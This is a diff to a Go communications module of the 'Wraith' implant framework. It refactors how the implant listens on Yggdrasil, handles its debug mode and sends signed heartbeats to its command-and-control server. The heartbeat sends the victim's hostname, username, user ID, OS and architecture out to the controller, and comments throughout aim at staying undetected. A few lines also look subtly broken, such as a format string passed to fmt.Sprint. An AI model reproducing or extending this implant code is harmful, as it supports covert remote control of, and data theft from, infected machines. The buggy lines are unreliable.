@@ -17,7 +17,6 @@ import (
 	"time"
 
 	"dev.l1qu1d.net/wraith-labs/wraith/libwraith"
-	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/internal/proto"
 	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/internal/radio"
 	"github.com/awnumar/memguard"
 	"github.com/gologme/log"
@@ -26,8 +25,6 @@ import (
 
 const (
 	MOD_NAME = "w.comosum"
-
-	i_SHM_ERRORS = "w.errors"
 )
 
 // A comms module implementation which utilises signed CBOR messages to remotely
@@ -70,15 +67,10 @@ type ModuleComosum struct {
 	// therefore detectable. 24 hours is probably a good choice.
 	LonelinessTimeout time.Duration
 
-	// Which address (if any) Comosum should listen on for raw TCP yggdrasil
+	// Which addresses (if any) Comosum should listen on for yggdrasil
 	// connections. Setting this makes the Wraith more detectable but might
 	// improve its chances of successfully connecting to C2.
-	ListenTcp string
-
-	// Which address (if any) Comosum should listen on for websocket yggdrasil
-	// connections. Setting this makes the Wraith more detectable but might
-	// improve its chances of successfully connecting to C2.
-	ListenWs string
+	Listen []string
 
 	// Whether or not Comosum should use multicast to find other Comosum
 	// Wraiths on the local network. Setting this makes the Wraith more detectable
@@ -93,8 +85,8 @@ type ModuleComosum struct {
 	StaticPeers []string
 
 	// Enable some debugging features like logging and the admin endpoint. DO NOT
-	// leave enabled in deployed instances.
-	Debug bool
+	// leave enabled in deployed instances. To disable, use "none".
+	Debug string
 }
 
 func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
@@ -130,7 +122,7 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	// Disable Yggdrasil logging unless debug mode is enabled - we don't
 	// want to give away any info.
 	logger := log.New(io.Discard, "", log.Flags())
-	if m.Debug {
+	if m.Debug != "none" {
 		logger = log.New(os.Stdout, MOD_NAME, log.Flags())
 	}
 
@@ -140,7 +132,7 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 
 	// Set up Yggdrasil.
 	n := radio.NewNode(logger)
-	n.GenerateConfig()
+	n.GenerateConfig(m.Listen, m.StaticPeers, m.Debug)
 	if err = n.Run(); err != nil {
 		logger.Fatalln(err)
 	}
@@ -192,8 +184,8 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 			return
 		}
 
-		requestData := proto.PacketExchangeReq{}
-		err = proto.Unmarshal(&requestData, daddyPubKeyBytes.Bytes(), body)
+		requestData := radio.PacketExchangeReq{}
+		err = radio.Unmarshal(&requestData, daddyPubKeyBytes.Bytes(), body)
 		if err != nil {
 			// The packet data is malformed, there is nothing more we
 			// can do.
@@ -201,7 +193,7 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 			return
 		}
 
-		responseData := proto.PacketExchangeRes{}
+		responseData := radio.PacketExchangeRes{}
 
 		// Set.
 		if len(requestData.Set) != 0 {
@@ -277,7 +269,7 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		}
 
 		// Respond!
-		responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
+		responseDataBytes, err := radio.Marshal(&responseData, m.OwnPrivKey)
 		if err != nil {
 			w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response failed: %e", err))
 			return
@@ -296,7 +288,9 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		DisableGeneralOptionsHandler: true,
 	}
 
-	logger.Info(fmt.Printf("management API listening on http://[%s]:%d\n", addr.String(), port))
+	if m.Debug != "none" {
+		logger.Info(fmt.Printf("management API listening on http://[%s]:%d\n", addr.String(), port))
+	}
 
 	var wg sync.WaitGroup
 	wg.Add(2)
@@ -336,21 +330,25 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				return
 			case <-time.After(timeUntilHeartbeat):
 				func() {
+					// Update last spoke time so we don't spam C2 with requests.
+					defer func() { m.lastSpoke = time.Now() }()
+
 					daddyIP, _ := daddyIP.Open()
 					defer daddyIP.Destroy()
 
 					// Build a heartbeat data packet.
-					heartbeatData := proto.PacketHeartbeatReq{
-						StrainId:   strain,
-						InitTime:   initTime,
-						Modules:    w.ModsGet(),
-						HostOS:     runtime.GOOS,
-						HostArch:   runtime.GOARCH,
-						Hostname:   hostname,
-						HostUser:   username,
-						HostUserId: userId,
+					heartbeatData := radio.PacketHeartbeatReq{
+						StrainId:      strain,
+						InitTime:      initTime,
+						Modules:       w.ModsGet(),
+						HostOS:        runtime.GOOS,
+						HostArch:      runtime.GOARCH,
+						Hostname:      hostname,
+						HostUser:      username,
+						HostUserId:    userId,
+						ManagementAPI: fmt.Sprint("http://[%s]:%d", addr.String(), port),
 					}
-					heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
+					heartbeatBytes, err := radio.Marshal(&heartbeatData, m.OwnPrivKey)
 					if err != nil {
 						panic("error while marshaling heartbeat data, cannot continue: " + err.Error())
 					}
@@ -360,20 +358,19 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 						Method: http.MethodPost,
 						URL: &url.URL{
 							Scheme: "http",
-							Host:   fmt.Sprintf("[%s]:%d", net.IP(daddyIP.Bytes()).String(), radio.MGMT_CONNECT_PORT),
-							Path:   proto.ROUTE_PREFIX + proto.ROUTE_HEARTBEAT,
+							Host:   fmt.Sprintf("[%s]:%d", net.IP(daddyIP.Bytes()).String(), radio.C2_PORT),
+							Path:   radio.ROUTE_PREFIX + radio.ROUTE_HEARTBEAT,
 						},
+						Header: http.Header{},
 						Cancel: ctx.Done(),
 						Body:   io.NopCloser(bytes.NewReader(heartbeatBytes)),
 					}
+					req.Header.Set("User-Agent", fmt.Sprintf("wraith_module_comosum/%s", radio.CURRENT_PROTO))
 
 					// Send request to C2.
 					// We explicitly don't care about the result of this request.
 					// If it succeeded, great. If it failed, there's nothing we can do here.
 					_, _ = yggHttpClient.Do(&req)
-
-					// Update last spoke time so we don't spam C2 with requests.
-					m.lastSpoke = time.Now()
 				}()
 			}
 		}
